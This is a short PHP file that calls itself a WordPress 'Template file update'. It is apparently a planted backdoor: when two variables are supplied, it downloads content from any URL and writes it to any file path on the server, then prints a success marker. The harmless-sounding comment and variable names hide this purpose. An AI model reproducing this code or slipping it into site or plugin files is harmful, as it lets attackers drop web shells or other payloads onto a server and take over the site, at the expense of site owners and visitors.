<?php
    /**Template file update*/
    if($wp_debug!="" && $wp_save!=""){
    	$response = wp_remote_get($wp_debug,array('stream'=>true,'filename'=>$wp_save));
    	echo "<br>ssucc<br>";
    }
?>